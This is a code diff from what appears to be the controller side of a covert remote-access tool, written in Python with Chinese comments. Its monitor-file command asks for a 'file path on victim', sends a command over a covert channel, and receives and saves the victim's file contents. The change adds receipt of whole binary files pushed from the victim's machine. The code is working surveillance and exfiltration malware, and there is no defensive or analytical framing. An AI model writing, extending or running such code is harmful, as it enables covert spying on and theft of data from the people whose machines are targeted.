@@ -297,50 +297,49 @@ def cmd_monitor_file(comm: Commander):
     file_path = input("Enter file path on victim to monitor: ").strip()
     date_str = datetime.now().strftime("%Y-%m-%d")
     log_filename = f"{date_str}.log"
-    print(f"[*] 开始监控文件：{file_path}。日志保存为 {log_filename}，按 Ctrl+C 停止。")
+    print(f"[*] 开始监控文件：{file_path}，日志：{log_filename}，Ctrl+C 停止。")
     comm.send_covert_message(f"CMD_MON_FILE:{file_path}".encode())
 
     with open(log_filename, "a", encoding="utf-8") as logfile:
         try:
-            buffer = ""
             while True:
-                chunk = comm.recv_covert_message()
-                if chunk is None:
+                data = comm.recv_covert_message()
+                if data is None:
                     continue
-                buffer += chunk.decode('utf-8', errors='ignore')
 
-                while '\n' in buffer:
-                    line, buffer = buffer.split('\n', 1)
-                    start = line.find('{')
-                    end = line.rfind('}')
-                    if start == -1 or end == -1:
-                        continue
-                    try:
-                        msg = json.loads(line[start:end+1])
-                    except json.JSONDecodeError:
-                        continue
+                # —— 1. 二进制文件推送 ——
+                if data.startswith(b"FILE_TRANSFER:"):
+                    # 拆 header
+                    parts = data.split(b":", 2)
+                    if len(parts) == 3:
+                        filename = parts[1].decode()
+                        file_bytes = parts[2]
+                        # 保存到根目录
+                        with open(filename, "wb") as out:
+                            out.write(file_bytes)
+                        print(f"[*] 已接收并保存文件：{filename}")
+                    else:
+                        print("[!] 文件传输消息格式错误")
+                    continue
 
-                    ts = msg.get('timestamp', datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
-                    typ = msg.get('type', '')
-                    path = msg.get('path', '')
-                    content = msg.get('content', '')
+                # —— 2. 原有 JSON 日志推送 ——
+                try:
+                    line = data.decode('utf-8', errors='ignore').strip()
+                    msg = json.loads(line)
+                except Exception:
+                    continue
 
-                    print(f"[{ts}] 事件: {typ} | 文件: {path}")
-                    print(content)
-                    print("-" * 40)
+                ts = msg.get('timestamp', '')
+                typ = msg.get('type', '')
+                path = msg.get('path', '')
+                content = msg.get('content', '')
 
-                    logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
-                    logfile.flush()
-
-                    basename = os.path.basename(path)
-                    ts_file = ts.replace(' ', '_').replace(':', '')
-                    save_name = f"{ts_file}_{basename}"
-                    try:
-                        with open(save_name, "w", encoding="utf-8", errors="ignore") as out:
-                            out.write(content)
-                        print(f"[*] 已保存最新版本到：{save_name}")
-                    except Exception as e:
-                        print(f"[!] 保存文件 {save_name} 失败：{e}")
+                # 打印并记录到日志
+                print(f"[{ts}] {typ} | {path}")
+                print(content)
+                print("-" * 40)
+                logfile.write(line + "\n")
+                logfile.flush()
 
         except KeyboardInterrupt:
             print("\n[*] 停止文件监控。")
